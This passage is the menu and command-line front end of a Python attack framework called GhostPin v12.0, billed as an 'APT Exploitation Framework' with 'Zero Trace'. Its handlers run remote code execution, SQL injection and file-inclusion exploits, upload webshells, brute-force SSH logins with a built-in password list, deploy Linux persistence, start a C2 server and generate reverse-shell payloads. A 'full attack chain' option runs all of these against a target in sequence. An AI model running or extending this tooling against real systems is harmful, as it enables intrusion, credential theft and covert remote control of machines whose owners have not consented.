{Colors.GREEN}[8]  Start C2 Server
{Colors.GREEN}[9]  Generate Payload
{Colors.RED}[10] Full Attack Chain
{Colors.PURPLE}[11] Show Results
{Colors.PURPLE}[12] Generate Report
{Colors.RED}[13] Exit
""")
    
    def apt_recon(self):
        target = input("[>] Target domain/IP: ").strip()
        if target:
            self.current_target = target
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
            
            filename = f"profile_{target}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(self.current_profile.__dict__, f, indent=2, default=str)
            cprint(f"[+] Profile saved to {filename}", Colors.GREEN)
    
    def rce_exploit(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        url = input("[>] Target URL: ").strip()
        param = input("[>] Parameter (cmd): ").strip() or "cmd"
        cmd = input("[>] Command (id): ").strip() or "id"
        
        exploit = RealExploitationEngine(self.current_profile)
        result = exploit.exploit_rce(url, param, cmd)
        self.results.append(result.__dict__)
        
        if result.success:
            cprint(f"[+] RCE Successful!", Colors.GREEN)
            cprint(f"    Output: {result.data.get('output', '')[:200]}", Colors.DIM)
        else:
            cprint("[-] RCE Failed", Colors.RED)
    
    def sqli_exploit(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        url = input("[>] Target URL: ").strip()
        param = input("[>] Parameter (id): ").strip() or "id"
        
        exploit = RealExploitationEngine(self.current_profile)
        result = exploit.exploit_sqli(url, param)
        self.results.append(result.__dict__)
        
        if result.success:
            cprint(f"[+] SQLi Successful!", Colors.GREEN)
            cprint(f"    Data: {result.data.get('response', '')[:200]}", Colors.DIM)
        else:
            cprint("[-] SQLi Failed", Colors.RED)
    
    def lfi_exploit(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        url = input("[>] Target URL: ").strip()
        param = input("[>] Parameter (file): ").strip() or "file"
        
        exploit = RealExploitationEngine(self.current_profile)
        result = exploit.exploit_lfi(url, param)
        self.results.append(result.__dict__)
        
        if result.success:
            cprint(f"[+] LFI Successful!", Colors.GREEN)
            cprint(f"    File: {result.data.get('file', '')}", Colors.DIM)
            cprint(f"    Content: {result.data.get('content', '')[:200]}", Colors.DIM)
        else:
            cprint("[-] LFI Failed", Colors.RED)
    
    def file_upload(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        target = input("[>] Target IP: ").strip() or self.current_profile.target
        port = int(input("[>] Port (80): ").strip() or "80")
        
        exploit = RealExploitationEngine(self.current_profile)
        result = exploit.deploy_webshell(target, port)
        self.results.append(result.__dict__)
        
        if result.success:
            cprint(f"[+] Webshell deployed!", Colors.GREEN)
            cprint(f"    URL: {result.data.get('url', '')}", Colors.CYAN)
        else:
            cprint("[-] Webshell deployment failed", Colors.RED)
    
    def ssh_bruteforce(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        target = input("[>] Target IP: ").strip() or self.current_profile.target
        username = input("[>] Username: ").strip() or "root"
        
        wordlist_file = input("[>] Wordlist file: ").strip()
        if not wordlist_file or not os.path.exists(wordlist_file):
            wordlist = ['password', '123456', 'admin', 'root', 'password123']
            cprint("[!] Using default wordlist", Colors.YELLOW)
        else:
            with open(wordlist_file, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        
        exploit = RealExploitationEngine(self.current_profile)
        result = exploit.exploit_ssh_bruteforce(target, username, wordlist)
        self.results.append(result.__dict__)
        
        if result.success:
            cprint(f"[+] SSH Credentials found!", Colors.GREEN)
            cprint(f"    {result.data.get('username')}:{result.data.get('password')}", Colors.RED)
        else:
            cprint("[-] SSH Bruteforce failed", Colors.RED)
    
    def deploy_persistence(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        target = input("[>] Target: ").strip() or self.current_profile.target
        username = input("[>] Username: ").strip()
        password = input("[>] Password: ").strip()
        payload = input("[>] Payload path: ").strip() or "/bin/bash"
        
        if not username:
            cprint("[-] Username required", Colors.RED)
            return
        
        persistence = PersistenceEngine(self.c2_server)
        result = persistence.deploy_linux(target, username, password, payload)
        self.results.append(result)
        
        if result['success']:
            cprint(f"[+] Persistence deployed with {len(result['methods'])} methods", Colors.GREEN)
        else:
            cprint("[-] Persistence deployment failed", Colors.RED)
    
    def start_c2(self):
        port = int(input("[>] Port (8080): ").strip() or "8080")
        self.c2_server.port = port
        self.c2_server.start()
        cprint("[+] C2 Server running", Colors.GREEN)
    
    def generate_payload(self):
        print("\nPayload types:")
        payload_types = list(self.payload_gen.payloads.keys())
        for i, pt in enumerate(payload_types, 1):
            print(f"  {i}. {pt}")
        
        choice = input("[>] Select payload type: ").strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(payload_types):
                payload_type = payload_types[idx]
                
                if 'shell' in payload_type or 'stager' in payload_type:
                    host = input("[>] LHOST: ").strip() or "127.0.0.1"
                    port = int(input("[>] LPORT (4444): ").strip() or "4444")
                    payload = self.payload_gen.generate(payload_type, host, port)
                else:
                    payload = self.payload_gen.generate(payload_type)
                
                if payload:
                    filename = f"payload_{payload_type}_{int(time.time())}.txt"
                    with open(filename, 'w') as f:
                        f.write(payload)
                    cprint(f"[+] Payload saved to {filename}", Colors.GREEN)
                    cprint(f"    Preview: {payload[:200]}...", Colors.DIM)
                else:
                    cprint("[-] Payload generation failed", Colors.RED)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def full_attack_chain(self):
        cprint("\n[FULL] Executing Full Attack Chain", Colors.RED, bold=True)
        cprint("="*70, Colors.RED)
        
        if not self.current_profile:
            target = input("[>] Target: ").strip()
            if not target:
                cprint("[-] Target required", Colors.RED)
                return
            
            cprint("[*] Running reconnaissance...", Colors.BLUE)
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
            self.current_target = target
        
        results = []
        
        # Phase 1: Web attacks
        for app in self.current_profile.web_applications[:3]:
            url = app['url']
            
            # RCE
            cprint("[*] Attempting RCE...", Colors.DIM)
            exploit = RealExploitationEngine(self.current_profile)
            rce_result = exploit.exploit_rce(url, 'cmd', 'id')
            results.append(rce_result.__dict__)
            if rce_result.success:
                cprint("[+] RCE successful!", Colors.GREEN)
            
            # SQLi
            cprint("[*] Attempting SQLi...", Colors.DIM)
            sqli_result = exploit.exploit_sqli(url, 'id')
            results.append(sqli_result.__dict__)
            if sqli_result.success:
                cprint("[+] SQLi successful!", Colors.GREEN)
            
            # LFI
            cprint("[*] Attempting LFI...", Colors.DIM)
            lfi_result = exploit.exploit_lfi(url, 'file')
            results.append(lfi_result.__dict__)
            if lfi_result.success:
                cprint("[+] LFI successful!", Colors.GREEN)
        
        # Phase 2: Upload webshell
        cprint("[*] Attempting webshell upload...", Colors.DIM)
        upload_result = exploit.deploy_webshell(self.current_profile.target, 80)
        results.append(upload_result.__dict__)
        
        # Phase 3: Persistence
        if not results:
            cprint("[-] No successful attacks, skipping persistence", Colors.RED)
        else:
            cprint("[*] Attempting persistence...", Colors.DIM)
            persistence = PersistenceEngine(self.c2_server)
            persist_result = persistence.deploy_linux(
                self.current_profile.target,
                "root", "password", "/bin/bash"
            )
            results.append(persist_result)
        
        self.results.extend(results)
        
        cprint("\n[+] Full Attack Chain Complete", Colors.GREEN)
        success_count = sum(1 for r in results if r.get('success', False))
        cprint(f"[+] Successful attacks: {success_count}/{len(results)}", Colors.CYAN)
    
    def show_results(self):
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" GHOSTPIN RESULTS", Colors.PURPLE, bold=True)
        print("="*70)
        
        for i, result in enumerate(self.results, 1):
            if isinstance(result, dict):
                status = "SUCCESS" if result.get('success') else "FAILED"
                color = Colors.GREEN if result.get('success') else Colors.RED
                method = result.get('method', 'Unknown')
                severity = result.get('severity', 'MEDIUM')
                cprint(f"[{i}] {method} -> {status}", color)
                cprint(f"    Severity: {severity}", Colors.YELLOW)
                if result.get('success') and result.get('data'):
                    data = result['data']
                    if isinstance(data, dict):
                        for key, value in data.items():
                            cprint(f"    {key}: {str(value)[:100]}", Colors.DIM)
        print("="*70)
    
    def generate_report(self):
        if not self.results:
            cprint("[!] No results to report", Colors.YELLOW)
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ghostpin_report_{timestamp}.json"
        
        report = {
            'version': VERSION,
            'author': AUTHOR,
            'timestamp': datetime.now().isoformat(),
            'target': self.current_target,
            'profile': self.current_profile.__dict__ if self.current_profile else {},
            'results': self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        cprint(f"[+] Report saved: {filename}", Colors.GREEN)
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v12.0 - Ultimate APT Exploitation Framework", Colors.CYAN)
        cprint("[*] APT Grade | Zero Trace | Full Spectrum Attack", Colors.DIM)
        cprint("[!] WARNING: This tool is for authorized security testing only", Colors.RED)
        cprint("[!] You are fully accountable for your actions", Colors.RED)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select (1-13): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.apt_recon()
            elif choice == '2':
                self.rce_exploit()
            elif choice == '3':
                self.sqli_exploit()
            elif choice == '4':
                self.lfi_exploit()
            elif choice == '5':
                self.file_upload()
            elif choice == '6':
                self.ssh_bruteforce()
            elif choice == '7':
                self.deploy_persistence()
            elif choice == '8':
                self.start_c2()
            elif choice == '9':
                self.generate_payload()
            elif choice == '10':
                self.full_attack_chain()
            elif choice == '11':
                self.show_results()
            elif choice == '12':
                self.generate_report()
            elif choice == '13':
                cprint("[*] Shutting down GhostPin...", Colors.GREEN)
                self.running = False
                if self.c2_server:
                    self.c2_server.stop()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="GhostPin v12.0 - Ultimate APT Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # Interactive Mode
  python3 ghostpin_v12.py
  
  # Reconnaissance
  python3 ghostpin_v12.py --recon example.com
  
  # RCE Exploit
  python3 ghostpin_v12.py --rce https://example.com --cmd id
  
  # SQL Injection
  python3 ghostpin_v12.py --sqli https://example.com/page?id=1
  
  # LFI Exploit
  python3 ghostpin_v12.py --lfi https://example.com/file?file=index
  
  # Full Attack Chain
  python3 ghostpin_v12.py --attack example.com
  
  # Start C2 Server
  python3 ghostpin_v12.py --c2 --port 8080
        """
    )
    
    parser.add_argument("--recon", help="Run reconnaissance on target")
    parser.add_argument("--rce", help="RCE exploit URL")
    parser.add_argument("--cmd", default="id", help="Command for RCE")
    parser.add_argument("--sqli", help="SQL injection URL")
    parser.add_argument("--lfi", help="LFI URL")
    parser.add_argument("--upload", help="File upload target")
    parser.add_argument("--ssh", help="SSH bruteforce target")
    parser.add_argument("--username", default="root", help="SSH username")
    parser.add_argument("--wordlist", help="SSH wordlist file")
    parser.add_argument("--persist", help="Deploy persistence on target")
    parser.add_argument("--c2", action="store_true", help="Start C2 server")
    parser.add_argument("--port", type=int, default=8080, help="Port for C2 server")
    parser.add_argument("--payload", help="Generate payload type")
    parser.add_argument("--attack", help="Full attack chain on target")
    parser.add_argument("--report", action="store_true", help="Generate report")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.recon:
        print_banner()
        recon = APTReconnaissance(args.recon)
        profile = recon.full_recon()
        output = args.output or f"profile_{args.recon}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(profile.__dict__, f, indent=2, default=str)
        cprint(f"[+] Profile saved to {output}", Colors.GREEN)
        sys.exit(0)
    
    if args.rce:
        print_banner()
        profile = APTTarget(target=args.rce)
        exploit = RealExploitationEngine(profile)
        result = exploit.exploit_rce(args.rce, 'cmd', args.cmd)
        print(json.dumps(result.__dict__, indent=2, default=str))
        sys.exit(0)
    
    if args.sqli:
        print_banner()
        profile = APTTarget(target=args.sqli)
        exploit = RealExploitationEngine(profile)
        result = exploit.exploit_sqli(args.sqli, 'id')
        print(json.dumps(result.__dict__, indent=2, default=str))
        sys.exit(0)
    
    if args.lfi:
        print_banner()
        profile = APTTarget(target=args.lfi)
        exploit = RealExploitationEngine(profile)
        result = exploit.exploit_lfi(args.lfi, 'file')
        print(json.dumps(result.__dict__, indent=2, default=str))
        sys.exit(0)
    
    if args.upload:
        print_banner()
        profile = APTTarget(target=args.upload)
        exploit = RealExploitationEngine(profile)
        result = exploit.deploy_webshell(args.upload, 80)
        print(json.dumps(result.__dict__, indent=2, default=str))
        sys.exit(0)
    
    if args.ssh:
        print_banner()
        profile = APTTarget(target=args.ssh)
        exploit = RealExploitationEngine(profile)
        
        if args.wordlist and os.path.exists(args.wordlist):
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        else:
            wordlist = ['password', '123456', 'admin', 'root', 'password123']
        
        result = exploit.exploit_ssh_bruteforce(args.ssh, args.username, wordlist)
        print(json.dumps(result.__dict__, indent=2, default=str))
        sys.exit(0)
    
    if args.attack:
        print_banner()
        recon = APTReconnaissance(args.attack)
        profile = recon.full_recon()
        
        exploit = RealExploitationEngine(profile)
        
        results = []
        for app in profile.web_applications[:3]:
            url = app['url']
            rce_result = exploit.exploit_rce(url, 'cmd', 'id')
            results.append(rce_result.__dict__)
            sqli_result = exploit.exploit_sqli(url, 'id')
            results.append(sqli_result.__dict__)
            lfi_result = exploit.exploit_lfi(url, 'file')
            results.append(lfi_result.__dict__)
        
        print(json.dumps(results, indent=2, default=str))
        sys.exit(0)
    
    if args.c2:
        print_banner()
        c2 = C2Server(port=args.port)
        c2.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            c2.stop()
        sys.exit(0)
    
    if args.payload:
        print_banner()
        payload_gen = ExploitPayloadGenerator()
        payload = payload_gen.generate(args.payload)
        if payload:
            filename = args.output or f"payload_{args.payload}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(payload)
            cprint(f"[+] Payload saved to {filename}", Colors.GREEN)
        else:
            cprint("[-] Payload generation failed", Colors.RED)
        sys.exit(0)
    
    if args.report:
        tool = GhostPinUltimate()
        tool.generate_report()
        sys.exit(0)
    
    # Interactive mode
    tool = GhostPinUltimate()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        import traceback
        traceback.print_exc()
        sys.exit(1)
